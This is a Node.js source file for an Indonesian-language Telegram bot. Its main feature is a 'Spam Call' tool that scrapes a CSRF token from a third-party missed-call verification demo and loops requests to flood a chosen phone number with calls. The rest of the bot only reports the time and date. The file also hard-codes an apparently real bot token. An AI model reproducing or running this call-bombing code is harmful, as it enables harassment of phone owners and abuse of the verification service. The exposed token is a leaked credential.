const TelegramBot = require('node-telegram-bot-api');
const request = require('request');
const moment = require('moment');
require('moment/locale/id');
moment.locale('id');

// Replace with your Telegram bot token
const token = '7252116522:AAHJlPUkFJJHjN3AufQ6jh6Zm1BIIN1RHLA';
const bot = new TelegramBot(token, {polling: true});

// Days and months in Indonesian
const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];

// Spam call function
function spamCall(no, jml, chatId) {
    const url = "https://www.citcall.com/demo/misscallapi.php";
    let n = 0;
    
    request.get(url, (error, response, body) => {
        if (error) {
            bot.sendMessage(chatId, "Error: " + error.message);
            return;
        }
        
        const tokenMatch = body.match(/id="csrf_token" value="(.*?)">/);
        if (!tokenMatch) {
            bot.sendMessage(chatId, "Failed to get token");
            return;
        }
        
        const token = tokenMatch[1];
        const headers = {
            'x-requested-with': 'XMLHttpRequest'
        };
        const data = {
            cid: no,
            trying: '0',
            csrf_token: token
        };
        
        const sendSpam = () => {
            if (n >= jml) return;
            
            request.post({
                url: url,
                form: data,
                headers: headers
            }, (err, res, body) => {
                if (err) {
                    bot.sendMessage(chatId, "Error: " + err.message);
                    return;
                }
                
                if (body.includes('Success')) {
                    n++;
                    const now = new Date();
                    const currentDay = days[now.getDay()];
                    const currentMonth = months[now.getMonth()];
                    const timeString = now.toLocaleTimeString('id-ID');
                    const dateString = `${now.getDate()} ${currentMonth} ${now.getFullYear()}`;
                    
                    bot.sendMessage(chatId, 
                        `[${n}] Terkirim ke => ${no}\n` +
                        `Hari: ${currentDay}\n` +
                        `Tanggal: ${dateString}\n` +
                        `Waktu: ${timeString}`);
                } else {
                    bot.sendMessage(chatId, "* Limit *\n\n* Coba satu jam lagi atau coba besok *");
                    return;
                }
                
                setTimeout(sendSpam, 4800);
            });
        };
        
        sendSpam();
    });
}

// Bot commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Spam Call", callback_data: "spam_call" }],
                [{ text: "Waktu Sekarang", callback_data: "current_time" }],
                [{ text: "Hari Ini", callback_data: "today" }]
            ]
        }
    };
    
    bot.sendMessage(chatId, "Pilih menu:", options);
});

bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const chatId = message.chat.id;
    
    if (callbackQuery.data === "spam_call") {
        bot.sendMessage(chatId, "Masukkan nomor telepon dengan kode negara (contoh: 62) dan jumlah spam, pisahkan dengan spasi:");
        
        bot.once('message', (msg) => {
            const text = msg.text.trim();
            const parts = text.split(' ');
            
            if (parts.length >= 2 && !isNaN(parts[0]) && !isNaN(parts[1])) {
                const no = parts[0];
                const jml = parseInt(parts[1]);
                bot.sendMessage(chatId, `Memulai spam call ke ${no} sebanyak ${jml} kali...`);
                spamCall(no, jml, chatId);
            } else {
                bot.sendMessage(chatId, "Format salah. Gunakan: [nomor] [jumlah]");
            }
        });
    } 
    else if (callbackQuery.data === "current_time") {
        const now = new Date();
        const timeString = now.toLocaleTimeString('id-ID');
        bot.sendMessage(chatId, `Waktu sekarang: ${timeString}`);
    }
    else if (callbackQuery.data === "today") {
        const now = new Date();
        const currentDay = days[now.getDay()];
        const currentMonth = months[now.getMonth()];
        const dateString = `${now.getDate()} ${currentMonth} ${now.getFullYear()}`;
        bot.sendMessage(chatId, `Hari ini: ${currentDay}, ${dateString}`);
    }
});

console.log("Bot is running...");
